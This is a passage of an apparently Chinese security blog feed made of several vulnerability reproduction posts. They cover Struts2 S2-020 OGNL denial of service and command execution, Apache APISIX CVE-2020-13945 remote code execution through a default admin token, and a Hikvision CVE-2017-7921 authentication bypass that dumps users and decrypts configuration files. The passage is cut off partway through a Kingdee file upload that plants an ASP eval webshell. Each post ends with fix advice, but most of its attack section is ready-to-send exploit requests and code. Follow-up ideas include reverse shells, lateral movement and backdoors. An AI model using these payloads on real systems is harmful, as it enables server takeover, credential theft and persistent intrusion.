至最新版（已修复部分接口信任逻辑）。</li><li>修改默认 Token，关闭未使用的管理 API。</li><li>前置网关限制管理接口访问（仅内网可访问）。</li><li>检查 <code>User-Agent</code> 信任链，仅允许来自可信内网 IP。</li><li>开启审计日志，及时发现异常账户创建行为。</li></ul><hr><h2 id="🔗-参考"><a href="#🔗-参考" class="headerlink" title="🔗 参考"></a>🔗 参考</h2><ul><li><a href="https://nacos.io/zh-cn/docs/what-is-nacos.html">Nacos 官方文档</a></li></ul><hr><p>🚨 <strong>总结</strong>：此漏洞核心点在于“后端接口对伪造 <code>User-Agent</code> 信任”，务必内网隔离、严格鉴权、及时更新！</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>Nacos</tag>
      
      <tag>权限绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞复现 - Struts2 S2-020 DoS 与 RCE 利用</title>
    <link href="/2025/03/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20Struts2%20S2-020%20DoS%20%E4%B8%8E%20RCE%20%E5%88%A9%E7%94%A8/"/>
    <url>/2025/03/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20Struts2%20S2-020%20DoS%20%E4%B8%8E%20RCE%20%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="📌-漏洞简介"><a href="#📌-漏洞简介" class="headerlink" title="📌 漏洞简介"></a>📌 漏洞简介</h2><p><strong>Struts2 S2-020</strong> 是 Apache Struts 2 框架中的一处高危漏洞，<br>其本质是 <strong>ClassLoader 可控</strong>，导致 OGNL 表达式可以修改服务器上下文属性，从而执行任意代码或破坏配置。</p><ul><li>影响版本：Struts 2.0.0 - Struts 2.3.15.1</li><li>漏洞点：未对 OGNL 表达式做充分的上下文属性过滤</li></ul><hr><h2 id="🚩-利用场景-1️⃣-拒绝服务（DoS）"><a href="#🚩-利用场景-1️⃣-拒绝服务（DoS）" class="headerlink" title="🚩 利用场景 1️⃣ - 拒绝服务（DoS）"></a>🚩 利用场景 1️⃣ - 拒绝服务（DoS）</h2><h3 id="⚙️-原理"><a href="#⚙️-原理" class="headerlink" title="⚙️ 原理"></a>⚙️ 原理</h3><p>通过可控 OGNL，修改 <code>classLoader</code> 加载的 <code>docBase</code> 路径，<br>如果将其改成一个不存在的目录，当前应用的映射会失效，访问任意路径都会返回 <strong>404</strong>，实现 DoS。</p><hr><h2 id="🗂️-漏洞环境"><a href="#🗂️-漏洞环境" class="headerlink" title="🗂️ 漏洞环境"></a>🗂️ 漏洞环境</h2><ul><li>目标：<code>http://xxx/uprr/goLoginJsp.ajax</code></li></ul><hr><h2 id="✅-利用示例"><a href="#✅-利用示例" class="headerlink" title="✅ 利用示例"></a>✅ 利用示例</h2><h3 id="构造恶意参数"><a href="#构造恶意参数" class="headerlink" title="构造恶意参数"></a>构造恶意参数</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/uprr/goLoginJsp.ajax?class.classLoader.resources.dirContext.docBase=不存在路径</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxx<br></code></pre></td></tr></table></figure><p><strong>请求示例：</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>xxx<span class="hljs-regexp">/uprr/g</span>oLoginJsp.ajax?class.classLoader.resources.dirContext.docBase=不存在路径<br></code></pre></td></tr></table></figure><hr><h3 id="✅-访问效果"><a href="#✅-访问效果" class="headerlink" title="✅ 访问效果"></a>✅ 访问效果</h3><ul><li>执行后，<strong>当前应用映射的物理路径被改成了一个不存在的目录</strong>；</li><li>所有后续访问都会返回 <code>404 Not Found</code>；</li><li>直至服务被重新部署或重启，服务不可用。</li></ul><hr><h3 id="📸-截图示例"><a href="#📸-截图示例" class="headerlink" title="📸 截图示例"></a>📸 截图示例</h3><h4 id="执行前："><a href="#执行前：" class="headerlink" title="执行前："></a>执行前：</h4><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714121941774.png" alt="image-20250714121941774"></p><h4 id="设置为不存在路径后，访问404："><a href="#设置为不存在路径后，访问404：" class="headerlink" title="设置为不存在路径后，访问404："></a>设置为不存在路径后，访问404：</h4><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714122012992.png" alt="image-20250714122012992"></p><hr><h2 id="🚩-场景-2️⃣-远程命令执行（RCE）"><a href="#🚩-场景-2️⃣-远程命令执行（RCE）" class="headerlink" title="🚩 场景 2️⃣ - 远程命令执行（RCE）"></a>🚩 场景 2️⃣ - 远程命令执行（RCE）</h2><h3 id="⚙️-原理-1"><a href="#⚙️-原理-1" class="headerlink" title="⚙️ 原理"></a>⚙️ 原理</h3><p>OGNL 表达式不仅能修改配置，还可调用 Java 类加载器、运行时对象，执行系统命令。</p><p>例如：</p><ul><li>调用 <code>java.lang.Runtime.getRuntime().exec()</code></li><li>输出命令结果到页面</li></ul><hr><h3 id="🗂️-漏洞环境-1"><a href="#🗂️-漏洞环境-1" class="headerlink" title="🗂️ 漏洞环境"></a>🗂️ 漏洞环境</h3><ul><li>目标 URL:<br><code>http://xxx/uprr/goLoginJsp.ajax</code></li></ul><hr><h3 id="✅-构造命令执行-POC"><a href="#✅-构造命令执行-POC" class="headerlink" title="✅ 构造命令执行 POC"></a>✅ 构造命令执行 POC</h3><p>下面示例执行 <code>whoami</code>：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http">GET /uprr/goLoginJsp.ajax?<br>method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,<br>%23a%3d@java.lang.Runtime@getRuntime().exec(&#x27;whoami&#x27;).getInputStream(),<br>%23b%3dnew%20java.io.InputStreamReader(%23a),<br>%23c%3dnew%20java.io.BufferedReader(%23b),<br>%23d%3dnew%20char[50000],<br>%23c.read(%23d),<br>%23out%3d@org.apache.struts2.ServletActionContext@getResponse().getWriter(),<br>%23out.println(%23d),<br>%23out.close() HTTP/1.1<br><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxx<br></code></pre></td></tr></table></figure><hr><h3 id="🔍-关键参数拆解"><a href="#🔍-关键参数拆解" class="headerlink" title="🔍 关键参数拆解"></a>🔍 关键参数拆解</h3><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td><code>method:#_memberAccess</code></td><td>关闭安全沙箱限制</td></tr><tr><td><code>#a</code></td><td>执行系统命令</td></tr><tr><td><code>#b</code></td><td>读命令输出</td></tr><tr><td><code>#c</code></td><td>缓冲流</td></tr><tr><td><code>#d</code></td><td>输出缓冲</td></tr><tr><td><code>#out</code></td><td>获得 Response Writer</td></tr></tbody></table><hr><h3 id="✅-效果示例"><a href="#✅-效果示例" class="headerlink" title="✅ 效果示例"></a>✅ 效果示例</h3><p>执行后，页面会直接回显命令结果：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">root<br></code></pre></td></tr></table></figure><hr><h2 id="🔗-通用-payload-变体"><a href="#🔗-通用-payload-变体" class="headerlink" title="🔗 通用 payload 变体"></a>🔗 通用 payload 变体</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http">?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,<br>#process=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;),<br>#is=new java.io.InputStreamReader(#process.getInputStream()),<br>#br=new java.io.BufferedReader(#is),<br>#res=new char[50000],<br>#br.read(#res),<br>@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(#res)<br></code></pre></td></tr></table></figure><ul><li>Windows 下可改 <code>whoami</code> &#x2F; <code>dir</code></li><li>Linux 下可改 <code>id</code> &#x2F; <code>ifconfig</code> &#x2F; <code>ping</code></li></ul><hr><h2 id="⚠️-影响"><a href="#⚠️-影响" class="headerlink" title="⚠️ 影响"></a>⚠️ 影响</h2><ul><li>该方法不需要上传文件或执行命令，只需要可访问漏洞点即可。</li><li>攻击难度低，极易被批量扫描滥用造成拒绝服务。</li></ul><hr><h2 id="🛡️-修复建议"><a href="#🛡️-修复建议" class="headerlink" title="🛡️ 修复建议"></a>🛡️ 修复建议</h2><p>✅ 官方修复：</p><ul><li>升级至 <strong>Struts 2.3.15.2</strong> 及以上版本</li><li>严格限制 OGNL 表达式可访问属性范围</li><li>生产环境禁用 <code>devMode</code></li><li>使用 WAF 拦截包含敏感 OGNL 字段的恶意参数</li></ul><hr><h2 id="🔍-漏洞利用拓展"><a href="#🔍-漏洞利用拓展" class="headerlink" title="🔍 漏洞利用拓展"></a>🔍 漏洞利用拓展</h2><p>除了 DoS，该漏洞还可用于：</p><ul><li><strong>远程命令执行（RCE）</strong>：执行系统命令，如 <code>ping</code>、<code>whoami</code></li><li>读取&#x2F;写入文件</li><li>服务器提权与持久化</li></ul><hr><h2 id="🔗-参考链接"><a href="#🔗-参考链接" class="headerlink" title="🔗 参考链接"></a>🔗 参考链接</h2><ul><li><a href="https://struts.apache.org/security/">官方公告 - S2-020</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2014-0094">漏洞 CVE</a></li></ul><hr><h2 id="📝-总结"><a href="#📝-总结" class="headerlink" title="📝 总结"></a>📝 总结</h2><ul><li><strong>DoS</strong>：直接断绝路径映射</li><li><strong>RCE</strong>：利用 OGNL 动态执行命令</li><li>危害：极易打点横向移动，后果严重</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>Struts2</tag>
      
      <tag>拒绝服务</tag>
      
      <tag>远程代码执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞复现 - Apache APISIX 默认 Token RCE 漏洞 (CVE-2020-13945)</title>
    <link href="/2025/03/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20Apache%20APISIX%20%E9%BB%98%E8%AE%A4%20Token%20RCE%20%E6%BC%8F%E6%B4%9E%20(CVE-2020-13945)/"/>
    <url>/2025/03/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20Apache%20APISIX%20%E9%BB%98%E8%AE%A4%20Token%20RCE%20%E6%BC%8F%E6%B4%9E%20(CVE-2020-13945)/</url>
    
    <content type="html"><![CDATA[<h2 id="🗂️-简介"><a href="#🗂️-简介" class="headerlink" title="🗂️ 简介"></a>🗂️ 简介</h2><p><strong>Apache APISIX</strong> 是一款云原生高性能 API 网关和微服务代理，广泛应用于企业网关、API 管理、负载均衡、动态路由等场景。</p><p><strong>CVE-2020-13945</strong> 漏洞的核心点在于：</p><ul><li>默认情况下，APISIX 管理端（Admin API）使用默认配置文件中的 Token（<code>edd1c9f034335f136f87ad84b625c8f1</code>）作为管理员认证凭证。</li><li>如果用户未更改 Token，攻击者可直接使用该默认 Token 访问管理 API。</li><li>管理 API 提供了通过 <code>script</code> 参数注入 Lua 脚本的功能，攻击者可插入恶意 Lua 代码，执行任意系统命令，进而远程控制服务器。</li></ul><p>🔥 <strong>危害极大</strong>：未授权 RCE，拿下整个网关后可进行流量劫持、横向移动等攻击。</p><hr><h2 id="⚙️-漏洞环境搭建"><a href="#⚙️-漏洞环境搭建" class="headerlink" title="⚙️ 漏洞环境搭建"></a>⚙️ 漏洞环境搭建</h2><p>这里使用 Vulhub 快速拉起测试环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> vulhub-master/apisix/CVE-2020-13945<br>docker-compose up<br></code></pre></td></tr></table></figure><p>环境启动后，访问：</p><ul><li><a href="http://192.168.199.132:9080/">http://192.168.199.132:9080</a></li></ul><p>可看到默认 404 页面，说明服务已启动成功。</p><hr><h2 id="🚩-漏洞复现"><a href="#🚩-漏洞复现" class="headerlink" title="🚩 漏洞复现"></a>🚩 漏洞复现</h2><h3 id="📌-1-添加恶意路由"><a href="#📌-1-添加恶意路由" class="headerlink" title="📌 1. 添加恶意路由"></a>📌 1. 添加恶意路由</h3><p>使用默认管理员 Token，调用 Admin API 新增一个带有恶意 Lua 脚本的路由：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/apisix/admin/routes</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.199.132:9080<br><span class="hljs-attribute">X-API-KEY</span><span class="hljs-punctuation">: </span>edd1c9f034335f136f87ad84b625c8f1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><br><span class="language-swift">&#123;</span><br><span class="language-swift">  <span class="hljs-string">&quot;uri&quot;</span>: <span class="hljs-string">&quot;/attack&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;script&quot;</span>: <span class="hljs-string">&quot;local _M = &#123;&#125; <span class="hljs-subst">\n</span> function _M.access(conf, ctx) <span class="hljs-subst">\n</span> local os = require(&#x27;os&#x27;)<span class="hljs-subst">\n</span> local args = assert(ngx.req.get_uri_args()) <span class="hljs-subst">\n</span> local f = assert(io.popen(args.cmd, &#x27;r&#x27;))<span class="hljs-subst">\n</span> local s = assert(f:read(&#x27;*a&#x27;))<span class="hljs-subst">\n</span> ngx.say(s)<span class="hljs-subst">\n</span> f:close() <span class="hljs-subst">\n</span> end <span class="hljs-subst">\n</span>return _M&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;upstream&quot;</span>: &#123;</span><br><span class="language-swift">    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;roundrobin&quot;</span>,</span><br><span class="language-swift">    <span class="hljs-string">&quot;nodes&quot;</span>: &#123;</span><br><span class="language-swift">      <span class="hljs-string">&quot;example.com:80&quot;</span>: <span class="hljs-number">1</span></span><br><span class="language-swift">    &#125;</span><br><span class="language-swift">  &#125;</span><br><span class="language-swift">&#125;</span><br></code></pre></td></tr></table></figure><p>如图所示：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714123543094.png" alt="image-20250714123543094"></p><hr><h3 id="📌-2-访问恶意路由触发-RCE"><a href="#📌-2-访问恶意路由触发-RCE" class="headerlink" title="📌 2. 访问恶意路由触发 RCE"></a>📌 2. 访问恶意路由触发 RCE</h3><p>此时访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.199.132:9080/attack?cmd=<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p>即可看到返回结果，表示命令执行成功：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714123558214.png" alt="image-20250714123558214"></p><p>此时可执行任意系统命令，如 <code>id</code>、<code>whoami</code>、<code>uname -a</code>、<code>curl</code> 等。</p><hr><h2 id="🕵️‍♂️-后续渗透思路"><a href="#🕵️‍♂️-后续渗透思路" class="headerlink" title="🕵️‍♂️ 后续渗透思路"></a>🕵️‍♂️ 后续渗透思路</h2><ul><li>📌 <strong>获取权限</strong>：可进一步执行反弹 Shell 命令，获取持久交互式 Shell。</li><li>📌 <strong>横向渗透</strong>：查看 APISIX 所部署的宿主机，获取更多 API 配置或凭证信息，尝试在内网横向。</li><li>📌 <strong>流量劫持</strong>：在网关层可注入恶意脚本修改流量、劫持请求、记录敏感数据。</li><li>📌 <strong>后门植入</strong>：保留恶意路由或修改网关插件，实现长时间驻留。</li></ul><hr><h2 id="🛡️-修复与缓解"><a href="#🛡️-修复与缓解" class="headerlink" title="🛡️ 修复与缓解"></a>🛡️ 修复与缓解</h2><p>✅ <strong>官方建议：</strong></p><ol><li><strong>修改默认 Token</strong>：在 <code>config.yaml</code> 中更改 <code>admin_key</code>，使用强随机值，并重启服务。</li><li><strong>最小化暴露</strong>：使用防火墙或代理，仅允许可信 IP 访问 Admin API（默认监听在 <code>127.0.0.1</code>，不要暴露在公网）。</li><li><strong>及时更新</strong>：升级至官方已修复版本，避免脚本注入风险。</li><li><strong>访问审计</strong>：定期审计路由配置及日志，排查可疑脚本或未知路由。</li></ol><hr><h2 id="⚠️-参考链接"><a href="#⚠️-参考链接" class="headerlink" title="⚠️ 参考链接"></a>⚠️ 参考链接</h2><ul><li><a href="https://apisix.apache.org/zh/blog/2020/08/05/apisix-default-admin-token/">官方安全公告</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-13945">漏洞详情</a></li><li><a href="https://github.com/vulhub/vulhub/tree/master/apisix/CVE-2020-13945">Vulhub 靶场</a></li></ul><hr><p>🚨 <strong>总结</strong>：这是一个典型的配置失误引发的远程命令执行案例，提醒大家部署生产环境务必修改默认凭证！</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>RCE</tag>
      
      <tag>Apache APISIX</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞复现 - 海康威视未授权访问漏洞 (CVE-2017-7921)</title>
    <link href="/2025/03/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20(CVE-2017-7921)/"/>
    <url>/2025/03/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20(CVE-2017-7921)/</url>
    
    <content type="html"><![CDATA[<h2 id="📌-漏洞简介"><a href="#📌-漏洞简介" class="headerlink" title="📌 漏洞简介"></a>📌 漏洞简介</h2><p>海康威视部分老版本设备存在认证绕过漏洞，攻击者可通过伪造的 Base64 <code>auth</code> 参数直接访问接口：</p><ul><li><strong>查看用户列表</strong></li><li><strong>抓取实时快照</strong></li><li><strong>下载配置文件并解密获取后门账户</strong></li></ul><hr><h2 id="🗂️-漏洞利用步骤"><a href="#🗂️-漏洞利用步骤" class="headerlink" title="🗂️ 漏洞利用步骤"></a>🗂️ 漏洞利用步骤</h2><hr><h3 id="✅-1️⃣-查看系统用户列表"><a href="#✅-1️⃣-查看系统用户列表" class="headerlink" title="✅ 1️⃣ 查看系统用户列表"></a>✅ 1️⃣ 查看系统用户列表</h3><p>访问示例：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>&lt;IP&gt;<span class="hljs-regexp">/Security/u</span>sers?auth=YWRtaW46MTEK<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714120307737.png" alt="image-20250714120307737"></p><ul><li><code>YWRtaW46MTEK</code> 是 <code>admin:11</code> 的 Base64 编码。</li></ul><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714120425378.png" alt="image-20250714120425378"></p><hr><h3 id="✅-2️⃣-获取系统监控快照（无需登录）"><a href="#✅-2️⃣-获取系统监控快照（无需登录）" class="headerlink" title="✅ 2️⃣ 获取系统监控快照（无需登录）"></a>✅ 2️⃣ 获取系统监控快照（无需登录）</h3><p>访问示例：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>&lt;IP&gt;<span class="hljs-regexp">/onvif-http/</span>snapshot?auth=YWRtaW46MTEK<br></code></pre></td></tr></table></figure><hr><h3 id="✅-3️⃣-下载并解密摄像机配置文件"><a href="#✅-3️⃣-下载并解密摄像机配置文件" class="headerlink" title="✅ 3️⃣ 下载并解密摄像机配置文件"></a>✅ 3️⃣ 下载并解密摄像机配置文件</h3><p>下载配置文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>&lt;IP&gt;<span class="hljs-regexp">/System/</span>configurationFile?auth=YWRtaW46MTEK<br></code></pre></td></tr></table></figure><p>解密命令（使用现成脚本）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 decrypt_configurationFile.py configurationFile<br></code></pre></td></tr></table></figure><p>GitHub 脚本地址：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://github.com/chrisjd20/hikvision_CVE-<span class="hljs-number">2017</span>-<span class="hljs-number">7921</span>_auth_bypass_config_decryptor<br></code></pre></td></tr></table></figure><p>解密后即可看到摄像头后台登录的账号密码信息：<br><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714115918548.png" alt="image-20250714115918548"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714120100191.png" alt="image-20250714120100191"></p><hr><h2 id="🛡️-修复建议"><a href="#🛡️-修复建议" class="headerlink" title="🛡️ 修复建议"></a>🛡️ 修复建议</h2><p>✅ 升级固件至海康威视官网提供的最新安全版本<br>✅ 禁用默认账户或修改弱密码<br>✅ 外网设备仅白名单 IP 可访问<br>✅ 对所有 API 启用多因素认证或严格 Token 验证<br>✅ 定期审计日志，发现异常访问</p><hr><h2 id="⚠️-声明"><a href="#⚠️-声明" class="headerlink" title="⚠️ 声明"></a>⚠️ 声明</h2><p><strong>本文档仅供安全研究与学习交流使用，切勿用于非法渗透测试或未授权攻击。</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>海康威视</tag>
      
      <tag>未授权访问</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞复现 - 金蝶云星空 ScpSupRegHandler 任意文件上传漏洞</title>
    <link href="/2025/03/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20%E9%87%91%E8%9D%B6%E4%BA%91%E6%98%9F%E7%A9%BA%20ScpSupRegHandler%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/03/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20%E9%87%91%E8%9D%B6%E4%BA%91%E6%98%9F%E7%A9%BA%20ScpSupRegHandler%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="📌-漏洞简介"><a href="#📌-漏洞简介" class="headerlink" title="📌 漏洞简介"></a>📌 漏洞简介</h2><p>金蝶云·星空（Kingdee Cloud Galaxy）是一款常用于企业 ERP 的云端产品。<br><code>ScpSupRegHandler</code> 是供应商注册模块的文件上传接口。</p><p><strong>漏洞点：</strong></p><ul><li>该接口对上传文件的路径和后缀过滤不严；</li><li>攻击者可通过构造特殊路径穿越，写入自定义可执行的 <code>.ashx</code> 文件；</li><li>再利用 <code>.ashx</code> 文件生成 ASP 一句话木马，实现远程命令执行。</li></ul><hr><h2 id="🗂️-漏洞环境示例"><a href="#🗂️-漏洞环境示例" class="headerlink" title="🗂️ 漏洞环境示例"></a>🗂️ 漏洞环境示例</h2><ul><li>目标：<code>http://xxx/k3cloud/</code></li><li>漏洞接口：<code>/k3cloud/SRM/ScpSupRegHandler</code></li><li>上传文件保存位置：<code>/uploadfiles/</code></li></ul><hr><h2 id="🚩-漏洞利用步骤"><a href="#🚩-漏洞利用步骤" class="headerlink" title="🚩 漏洞利用步骤"></a>🚩 漏洞利用步骤</h2><h3 id="✅-1️⃣-构造上传请求"><a href="#✅-1️⃣-构造上传请求" class="headerlink" title="✅ 1️⃣ 构造上传请求"></a>✅ 1️⃣ 构造上传请求</h3><p>通过 <code>multipart/form-data</code> 向 <code>ScpSupRegHandler</code> 上传恶意的 <code>.ashx</code> 文件：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/k3cloud/SRM/ScpSupRegHandler</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxx<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=zjkwwino<br><br><span class="language-pgsql"><span class="hljs-comment">--zjkwwino</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;dbId_v&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">.</span><br><span class="language-pgsql"><span class="hljs-comment">--zjkwwino</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;FID&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-number">2022</span></span><br><span class="language-pgsql"><span class="hljs-comment">--zjkwwino</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;FAtt&quot;; filename=&quot;../../../../uploadfiles/test.ashx&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;%@ WebHandler <span class="hljs-keyword">Language</span>=&quot;C#&quot; <span class="hljs-keyword">class</span>=&quot;Handler&quot; %&gt;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-keyword">using</span> <span class="hljs-keyword">System</span>;</span><br><span class="language-pgsql"><span class="hljs-keyword">using</span> <span class="hljs-keyword">System</span>.Web;</span><br><span class="language-pgsql"><span class="hljs-keyword">using</span> <span class="hljs-keyword">System</span>.IO;</span><br><span class="language-pgsql"><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> <span class="hljs-keyword">Handler</span> : IHttpHandler &#123;</span><br><span class="language-pgsql">  <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> ProcessRequest (HttpContext context) &#123;</span><br><span class="language-pgsql">    context.Response.ContentType = &quot;text/plain&quot;;</span><br><span class="language-pgsql">    StreamWriter file1 = File.CreateText(context.<span class="hljs-keyword">Server</span>.MapPath(&quot;root.asp&quot;));</span><br><span class="language-pgsql">    file1.<span class="hljs-keyword">Write</span>(&quot;&lt;%eval request(\&quot;ant\&quot;)%&gt;&quot;);</span><br><span class="language-pgsql">    file1.Flush();</span><br><span class="language-pgsql">    file1.<span class="hljs-keyword">Close</span>();</span><br><span class="language-pgsql">  &#125;</span><br><span class="language-pgsql">  <span class="hljs-built_in">public</span> <span class="hljs-type">bool</span> IsReusable &#123;</span><br><span class="language-pgsql">    <span class="hljs-keyword">get</span> &#123; <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>; &#125;</span><br><span class="language-pgsql">  &#125;</span><br><span class="language-pgsql">&#125;</span><br><span class="language-pgsql"><span class="hljs-comment">--zjkwwino--</span></span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714121323755.png" alt="image-20250714121323755"></p><p>🔑 <strong>关键点：</strong></p><ul><li>使用 <code>../../../../</code> 路径穿越，写入到 <code>uploadfiles</code> 目录。</li><li><code>.ashx</code> 文件执行后会在相同目录生成 <code>root.asp</code> 后门文件。</li></ul><hr><h3 id="✅-2️⃣-访问生成的后门"><a href="#✅-2️⃣-访问生成的后门" class="headerlink" title="✅ 2️⃣ 访问生成的后门"></a>✅ 2️⃣ 访问生成的后门</h3><p>上传完成后，访问恶意 <code>.ashx</code> 文件触发执行：</p><figure class="highlight bash"><table><tr><td 